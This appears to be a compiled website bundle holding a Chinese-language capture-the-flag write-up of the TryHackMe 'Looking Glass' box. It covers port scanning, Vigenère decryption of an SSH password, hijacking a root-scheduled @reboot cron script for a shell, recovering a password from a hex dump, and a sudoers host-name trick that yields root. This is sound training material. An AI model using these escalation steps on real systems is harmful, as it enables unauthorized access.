"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[9265],{5782:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>r,contentTitle:()=>l,default:()=>h,frontMatter:()=>o,metadata:()=>i,toc:()=>c});var t=s(74848),a=s(28453);const o={sidebar_position:96,tags:["Easy","Linux","\u5bc6\u7801\u5b66","\u5b9a\u65f6\u4efb\u52a1","SUDO"],title:"Looking Glass",description:"Looking Glass",sidebar_label:"Looking Glass",slug:"/tryhackme/96"},l="Looking Glass",i={id:"box/TryHackMe/96",title:"Looking Glass",description:"Looking Glass",source:"@site/docs/box/TryHackMe/96.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/96",permalink:"/docs/tryhackme/96",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"\u5bc6\u7801\u5b66",permalink:"/docs/tags/\u5bc6\u7801\u5b66"},{label:"\u5b9a\u65f6\u4efb\u52a1",permalink:"/docs/tags/\u5b9a\u65f6\u4efb\u52a1"},{label:"SUDO",permalink:"/docs/tags/sudo"}],version:"current",sidebarPosition:96,frontMatter:{sidebar_position:96,tags:["Easy","Linux","\u5bc6\u7801\u5b66","\u5b9a\u65f6\u4efb\u52a1","SUDO"],title:"Looking Glass",description:"Looking Glass",sidebar_label:"Looking Glass",slug:"/tryhackme/96"},sidebar:"boxSidebar",previous:{title:"GoldenEye",permalink:"/docs/tryhackme/95"},next:{title:"HA Joker CTF",permalink:"/docs/tryhackme/97"}},r={},c=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"\u7b5b\u9009\u7aef\u53e3",id:"\u7b5b\u9009\u7aef\u53e3",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"jabberwock",id:"jabberwock",level:3},{value:"jabberwock \u2014&gt; tweedledum",id:"jabberwock--tweedledum",level:3},{value:"tweedledum  \u2014&gt; humptydumpty",id:"tweedledum---humptydumpty",level:3},{value:"humptydumpty \u2014&gt; alice",id:"humptydumpty--alice",level:3},{value:"alice \u2014&gt; root",id:"alice--root",level:3}];function d(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,a.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.h1,{id:"looking-glass",children:"Looking Glass"}),"\n",(0,t.jsx)(n.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-210-11:~/lookingglass# nmap -sT -p- --min-rate 1000 10.10.120.27\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-09-18 01:21 BST\nNmap scan report for ip-10-10-120-27.eu-west-1.compute.internal (10.10.120.27)\nHost is up (0.0042s latency).\nNot shown: 60534 closed ports\nPORT      STATE SERVICE\n22/tcp    open  ssh\n9000/tcp  open  cslistener\n....\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u5f53\u6211\u4eec\u8fdb\u884c\u7aef\u53e3\u626b\u63cf\u65f6, \u4f1a\u62a5\u51fa\u5f88\u591a\u7aef\u53e3, \u6839\u636e\u5bf9\u5e94\u7684\u60c5\u51b5\u731c\u6d4b, \u8fd9\u4e2a\u9898\u5e94\u8be5\u662f\u8981\u6211\u4eec\u7b5b\u9009\u51fa\u6b63\u786e\u7684\u7aef\u53e3"}),"\n",(0,t.jsx)(n.h2,{id:"\u7b5b\u9009\u7aef\u53e3",children:"\u7b5b\u9009\u7aef\u53e3"}),"\n",(0,t.jsx)(n.p,{children:"\u5f53\u6211\u4eec\u4f7f\u7528 SSH \u8fde\u63a5\u76ee\u6807\u65f6, \u4f1a\u4e00\u76f4\u62a5\u51fa\u4e00\u4e9b\u4fe1\u606f, \u6839\u636e\u60c5\u51b5\u5206\u6790\u5e94\u8be5\u65f6\u9488\u5bf9\u6211\u4eec\u7684\u7aef\u53e3, \u56e0\u6b64\u6211\u4f7f\u7528\u4e8c\u5206\u6cd5\u8fdb\u884c\u67e5\u8be2, \u4ece\u4e2d\u7b5b\u9009\u5230\u4e86\u6b63\u786e\u7684\u7aef\u53e3"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703223742.png",alt:"20240703223742"})}),"\n",(0,t.jsx)(n.p,{children:"\u5f53\u6211\u8fde\u63a5\u6b63\u786e\u7684\u7aef\u53e3\u65f6, \u5176\u7ed9\u4e86\u6211\u4e00\u6bb5\u5185\u5bb9, \u8be2\u95ee\u6211\u8981 secret , \u6839\u636e\u60c5\u51b5\u6211\u4eec\u9700\u8981\u89e3\u5bc6\u5176\u4e2d\u7684\u5185\u5bb9"}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:["\u5728\u6587\u7ae0\u9996\u90e8\u6709: Jabberwocky , \u7ecf\u8fc7\u67e5\u627e\u6211\u53d1\u73b0\u4e86 ",(0,t.jsx)(n.a,{href:"https://www.poetryfoundation.org/poems/42916/jabberwocky",children:"jabberwocky"})," \u8fd9\u5e94\u8be5\u662f\u539f\u6587"]}),"\n",(0,t.jsxs)(n.li,{children:["\u63a5\u7740\u6211\u4f7f\u7528\u5de5\u5177\u5224\u65ad\u5bf9\u5e94\u7684\u52a0\u5bc6\u7c7b\u578b, \u5f97\u5230\u4e3a ",(0,t.jsx)(n.strong,{children:"Vigen\xe8re ,"})," \u63a5\u7740\u6211\u8be2\u95ee\u4e86 GPT \u540e\u5f97\u77e5\u77e5\u9053\u5bc6\u6587\u548c\u539f\u6587\u6211\u4eec\u5c31\u53ef\u4ee5\u83b7\u53d6\u5230\u5176 key"]}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-210-11:~/lookingglass# ssh 10.10.120.27 -p 10206\nYou've found the real service.\nSolve the challenge to get access to the box\nJabberwocky\n'Mdes mgplmmz, cvs alv lsmtsn aowil\nFqs ncix hrd rxtbmi bp bwl arul;\nElw bpmtc pgzt alv uvvordcet,\nEgf bwl qffl vaewz ovxztiql.\n\n'Fvphve ewl Jbfugzlvgb, ff woy!\nIoe kepu bwhx sbai, tst jlbal vppa grmjl!\nBplhrf xag Rjinlu imro, pud tlnp\nBwl jintmofh Iaohxtachxta!'\n\nOi tzdr hjw oqzehp jpvvd tc oaoh:\nEqvv amdx ale xpuxpqx hwt oi jhbkhe--\nHv rfwmgl wl fp moi Tfbaun xkgm,\nPuh jmvsd lloimi bp bwvyxaa.\n\nEno pz io yyhqho xyhbkhe wl sushf,\nBwl Nruiirhdjk, xmmj mnlw fy mpaxt,\nJani pjqumpzgn xhcdbgi xag bjskvr dsoo,\nPud cykdttk ej ba gaxt!\n\nVnf, xpq! Wcl, xnh! Hrd ewyovka cvs alihbkh\nEwl vpvict qseux dine huidoxt-achgb!\nAl peqi pt eitf, ick azmo mtd wlae\nLx ymca krebqpsxug cevm.\n\n'Ick lrla xhzj zlbmg vpt Qesulvwzrr?\nCpqx vw bf eifz, qy mthmjwa dwn!\nV jitinofh kaz! Gtntdvl! Ttspaj!'\nWl ciskvttk me apw jzn.\n\n'Awbw utqasmx, tuh tst zljxaa bdcij\nWph gjgl aoh zkuqsi zg ale hpie;\nBpe oqbzc nxyi tst iosszqdtz,\nEew ale xdte semja dbxxkhfe.\nJdbr tivtmi pw sxderpIoeKeudmgdstd\nEnter Secret:\n"})}),"\n",(0,t.jsxs)(n.p,{children:["\u56e0\u6b64\u6211\u5229\u7528\u539f\u6587\u548c\u5bc6\u6587\u8fdb\u884c\u4e86\u83b7\u53d6 key \u7684\u64cd\u4f5c, \u83b7\u53d6\u5230 key \u540e\u6839\u636eVigen\xe8re \u7684\u52a0\u5bc6\u89c4\u77e9\u6211\u4ece\u4e2d\u63d0\u6743\u5230\u4e86 key : Thealphabetcipher, \u5229\u7528\u5f97\u5230\u7684 key \u8fdb\u884c\u89e3\u5bc6\u540e\u5f97\u5230\u4e86\u4e00\u4e2a\u7528\u6237\u7684 SSH \u5bc6\u7801",(0,t.jsx)(n.a,{href:"https://gchq.github.io/CyberChef/#recipe=Vigen%C3%A8re_Decode('TwasbrilligandtheslithytovesDidgyreandgimbleinthewabeAllmimsyweretheborogovesAndthemomerathsoutgrabe')&input=TWRlc21ncGxtbXpjdnNhbHZsc210c25hb3dpbEZxc25jaXhocmRyeHRibWlicGJ3bGFydWxFbHdicG10Y3BnenRhbHZ1dnZvcmRjZXRFZ2Zid2xxZmZsdmFld3pvdnh6dGlxbA",children:"CyberChef"})]}),"\n",(0,t.jsx)(n.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,t.jsx)(n.h3,{id:"jabberwock",children:"jabberwock"}),"\n",(0,t.jsx)(n.p,{children:"\u5229\u7528\u6b64\u5bc6\u7801\u8fdb\u884c\u767b\u9646, \u5728\u767b\u9646\u4e4b\u540e\u6211\u53d1\u73b0\u7528\u6237\u5177\u6709 SUDO \u7279\u6743\u4f46\u662f\u662f\u91cd\u542f\u4e3b\u673a\u7684, \u540c\u65f6\u67e5\u770b\u5b9a\u65f6\u4efb\u52a1\u6211\u53d1\u73b0\u6709\u4e00\u6761\u7cfb\u7edf\u91cd\u542f\u65f6\u6267\u884c\u7684\u5b9a\u65f6\u4efb\u52a1"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"jabberwock@looking-glass:~$ sudo -l\nMatching Defaults entries for jabberwock on looking-glass:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser jabberwock may run the following commands on looking-glass:\n    (root) NOPASSWD: /sbin/reboot\njabberwock@looking-glass:~$ cat /etc/crontab\n# /etc/crontab: system-wide crontab\n# Unlike any other crontab you don't have to run the `crontab'\n# command to install the new version when you edit this file\n# and files in /etc/cron.d. These files also have username fields,\n# that none of the other crontabs do.\n\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# m h dom mon dow user\tcommand\n17 *\t* * *\troot    cd / && run-parts --report /etc/cron.hourly\n25 6\t* * *\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n47 6\t* * 7\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )\n52 6\t1 * *\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )\n#\n@reboot tweedledum bash /home/jabberwock/twasBrillig.sh\n"})}),"\n",(0,t.jsxs)(n.p,{children:["\u56e0\u4e3a\u5bf9\u5e94\u7684\u6267\u884c\u811a\u672c\u6211\u4eec\u6709\u6743\u63a7\u5236\u5e76\u4e14\u662f\u4ee5 tweedledum  \u7528\u6237\u8eab\u4efd\u8fd0\u884c\u7684, \u6240\u4ee5\u4fee\u6539 ",(0,t.jsx)(n.code,{children:"twasBrillig.sh"})," \u7684\u5185\u5bb9\u6765\u83b7\u53d6\u53cd\u5411 Shell"]}),"\n",(0,t.jsx)(n.h3,{id:"jabberwock--tweedledum",children:"jabberwock \u2014> tweedledum"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703223856.png",alt:"20240703223856"})}),"\n",(0,t.jsx)(n.h3,{id:"tweedledum---humptydumpty",children:"tweedledum  \u2014> humptydumpty"}),"\n",(0,t.jsx)(n.p,{children:"\u5728\u7528\u6237 tweedledum   \u7684\u5bb6\u76ee\u5f55\u4e2d\u6709\u4e00\u4e2a tweedledum.txt \u6587\u4ef6, \u67e5\u770b\u5176\u5185\u5bb9\u5224\u65ad\u5e94\u8be5\u65f6\u5341\u516d\u8fdb\u5236\u8f6c\u50a8, \u56e0\u6b64\u6211\u5c06\u5176\u4e0b\u8f7d\u5e76\u8fdb\u884c\u4e86\u67e5\u770b"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-210-11:~/lookingglass# xxd -r -p humptydumpty.txt  > output\nroot@ip-10-10-210-11:~/lookingglass# hexdump -C output\n00000000  dc ff f5 eb 40 42 3f 05  5a 4c d0 a8 d7 ed 39 ff  |....@B?.ZL....9.|\n00000010  6c b9 81 68 68 f5 76 6b  40 88 b9 e9 90 69 61 b9  |l..hh.vk@....ia.|\n00000020  76 92 c3 ad 35 40 bb 80  3c 02 0b 3a ee 66 cd 88  |v...5@..<..:.f..|\n00000030  87 12 32 34 ea 0c 6e 71  43 c0 ad d7 3f f4 31 ed  |..24..nqC...?.1.|\n00000040  28 39 1d 3b c6 4e c1 5c  bb 09 04 26 b0 4a a6 b7  |(9.;.N.\\...&.J..|\n00000050  64 9c 3c c8 5f 11 23 0b  b0 10 5e 02 d1 5e 36 24  |d.<._.#...^..^6$|\n00000060  b8 08 e1 56 d1 8d 1c ec  dc c1 45 63 75 f8 ca e9  |...V......Ecu...|\n00000070  94 c3 65 49 a0 7c 8c 23  15 b4 73 dd 9d 7f 40 4f  |..eI.|.#..s...@O|\n00000080  fa 51 fd 49 ab f6 77 05  d6 a3 5d 18 21 8c 11 5f  |.Q.I..w...].!.._|\n00000090  f5 63 3a ec 1f 9e bf dc  9d 5d 49 56 41 6f 57 f6  |.c:......]IVAoW.|\n000000a0  b9 77 6d 7d df 45 9c 9a  d5 b0 e1 d6 ac 61 e2 7b  |.wm}.E.......a.{|\n000000b0  ef b5 e9 9f d6 24 46 67  76 00 d7 ca ce f5 44 d0  |.....$Fgv.....D.|\n000000c0  5e 88 48 98 da 28 04 71  51 d0 e5 6f 8d c6 29 27  |^.H..(.qQ..o..)'|\n000000d0  73 60 3d 0d 6a ab bd d6  2a 11 ef 72 1d 15 42 d8  |s`=.j...*..r..B.|\n000000e0  74 68 65 20 70 61 73 73  77 6f 72 64 20 69 73 20  |the password is |\n000000f0  7a 79 78 77 76 75 74 73  72 71 70 6f 6e 6d 6c 6b  |zyxwvutsrqponmlk|\n00000100\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u5728\u8fd9\u91cc\u83b7\u53d6\u5230\u4e86\u7528\u6237 humptydumpty \u7684\u5bc6\u7801"}),"\n",(0,t.jsx)(n.h3,{id:"humptydumpty--alice",children:"humptydumpty \u2014> alice"}),"\n",(0,t.jsx)(n.p,{children:"\u6211\u6ce8\u610f\u5230 alice \u7528\u6237\u7684\u5bb6\u76ee\u5f55\u5177\u6709\u516c\u5171 x \u6743\u9650, \u90a3\u4e48\u4e5f\u5c31\u662f\u8bf4, \u53ea\u8981\u6743\u9650\u9002\u5f53\u6211\u4eec\u5c31\u53ef\u4ee5\u8bfb\u53d6\u5176\u4e2d\u7684\u5185\u5bb9"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703223943.png",alt:"20240703223943"})}),"\n",(0,t.jsx)(n.h3,{id:"alice--root",children:"alice \u2014> root"}),"\n",(0,t.jsx)(n.p,{children:"\u4f7f\u7528\u811a\u672c\u8fdb\u884c\u67e5\u627e\u540e\u6211\u53d1\u73b0\u4e86\u4e00\u4e2a\u7279\u6b8a\u7684\u6587\u4ef6"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"alice@looking-glass:/etc/sudoers.d$ cat alice \nalice ssalg-gnikool = (root) NOPASSWD: /bin/bash\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u8be5\u547d\u4ee4\u7684\u4f5c\u7528\u662f,\u5141\u8bb8 alice \u7528\u6237\u5728 ssalg-gnikool \u4e3b\u673a\u4e0a\u4f7f\u7528 root \u7528\u6237\u7684\u8eab\u4efd\u8fd0\u884c /bin/bash"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"alice@looking-glass:/etc/sudoers.d$ sudo -h ssalg-gnikool /bin/bash -p\nsudo: unable to resolve host ssalg-gnikool\nroot@looking-glass:/etc/sudoers.d# id\nuid=0(root) gid=0(root) groups=0(root)\n"})})]})}function h(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(d,{...e})}):d(e)}},28453:(e,n,s)=>{s.d(n,{R:()=>l,x:()=>i});var t=s(96540);const a={},o=t.createContext(a);function l(e){const n=t.useContext(o);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function i(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:l(e.components),t.createElement(o.Provider,{value:n},e.children)}}}]);